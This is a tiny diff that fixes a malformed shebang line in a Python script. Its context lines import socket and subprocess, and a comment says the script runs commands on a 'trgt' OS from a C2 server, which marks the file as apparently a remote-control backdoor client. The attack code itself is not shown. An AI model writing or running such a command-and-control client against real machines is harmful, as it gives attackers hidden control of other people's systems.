@@ -1,4 +1,4 @@
-:#!/usr/bin/python3
+#!/usr/bin/python3
 
 import socket
 import subprocess # libray which enables us to use trgt OS command in C2 server
